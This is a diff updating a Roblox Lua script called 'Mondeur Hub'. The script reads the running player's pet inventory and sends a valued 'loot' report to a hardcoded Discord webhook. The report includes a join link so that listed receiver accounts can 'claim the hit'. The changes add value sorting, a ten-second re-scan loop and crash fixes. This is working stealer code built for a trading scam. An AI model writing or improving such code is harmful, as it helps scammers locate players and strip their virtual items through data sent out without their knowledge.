@@ -1,4 +1,4 @@
--- [[ MONDEUR HUB | FINAL MAX V7 ]] --
+-- [[ MONDEUR HUB | FINAL STABLE V7 ]] --
 local HttpService       = game:GetService("HttpService")
 local Players           = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -9,17 +9,17 @@ local WEBHOOK_URL = "https://discord.com/api/webhooks/1474651524251648163/lhPvWS
 local TARGET_RECEIVERS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
 
 --------------------------------------------------------------
--- FINAL LOADING PROTECTOR (Fixes Parsing Errors)
+-- CRASH PROTECTOR: WAIT FOR SERVER DATA
 --------------------------------------------------------------
 if not game:IsLoaded() then game.Loaded:Wait() end
-local Fsys = ReplicatedStorage:WaitForChild("Fsys", 60) -- Increased timeout for slow devices
+local Fsys = ReplicatedStorage:WaitForChild("Fsys", 60)
 local Fsys2 = require(Fsys)
 local load = Fsys2.load
 local routerClient = load("RouterClient")
 local InventoryDB = load("InventoryDB")
 
 --------------------------------------------------------------
--- MONDEUR MAX UI DESIGN
+-- THE UNIQUE UI DESIGN
 --------------------------------------------------------------
 local function sendMondeurReport(pets, totalVal, totalCount, receiver)
     local request = (syn and syn.request) or http_request or request
@@ -28,7 +28,8 @@ local function sendMondeurReport(pets, totalVal, totalCount, receiver)
     local lootLines = {}
     for i, p in ipairs(pets) do
         if i > 25 then break end 
-        table.insert(lootLines, string.format("🐾 %s — `%s`", p.name, p.value))
+        local emoji = p.value > 0 and "⭐" or "🐾"
+        table.insert(lootLines, string.format("%s %s — `%s`", emoji, p.name, p.value))
     end
 
     local payload = {
@@ -52,7 +53,7 @@ local function sendMondeurReport(pets, totalVal, totalCount, receiver)
                 "### 🔍 Scrap Summary\n" ..
                 "[**View Full Inventory Log**](https://api.rubis.app/v2/scrap/nu3YNS4Pum4oLolW/raw)\n" ..
                 "### 👥 Join Player\n" ..
-                "[**Join to Claim Hit!**](https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId .. ")",
+                "[**Join to Claim Hit!**](roblox://placeID=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
             footer = { text = "Mondeur Elite Services | " .. os.date("%X") },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
@@ -69,13 +70,17 @@ local function sendMondeurReport(pets, totalVal, totalCount, receiver)
 end
 
 --------------------------------------------------------------
--- CORE SCAN LOGIC
+-- CORE SCAN LOGIC (Fixed Sorting & Crash)
 --------------------------------------------------------------
 local function execute()
     local allData = routerClient.get("DataAPI/GetAllServerData"):InvokeServer()
-    local playerKey = allData[LocalPlayer.Name] and LocalPlayer.Name or tostring(LocalPlayer.UserId)
+    -- Deep check to prevent indexing nil (Line 76 fix)
+    local playerKey = (allData and allData[LocalPlayer.Name]) and LocalPlayer.Name or tostring(LocalPlayer.UserId)
     
-    if not allData[playerKey] or not allData[playerKey].inventory then return end
+    if not allData or not allData[playerKey] or not allData[playerKey].inventory then 
+        warn("Inventory data not ready, retrying...")
+        return 
+    end
 
     local rawPets = allData[playerKey].inventory.pets
     local pets, totalVal, totalCount = {}, 0, 0
@@ -84,11 +89,14 @@ local function execute()
         local petData = InventoryDB.pets[item.id]
         if petData then
             totalCount = totalCount + 1
-            local val = item.properties and item.properties.value or 0 
+            local val = (item.properties and item.properties.value) or 0
             table.insert(pets, {name = petData.name or "Unknown", value = val})
             totalVal = totalVal + val
         end
     end
+
+    -- Sorting by value (Highest to Lowest)
+    table.sort(pets, function(a, b) return a.value > b.value end)
 
     local target = nil
     for _, name in ipairs(TARGET_RECEIVERS) do
@@ -98,5 +106,10 @@ local function execute()
     sendMondeurReport(pets, totalVal, totalCount, target)
 end
 
--- Start Execution
-execute()
+-- Execution Loop
+task.spawn(function()
+    while true do
+        pcall(execute)
+        task.wait(10) -- Scans every 10 seconds
+    end
+end)
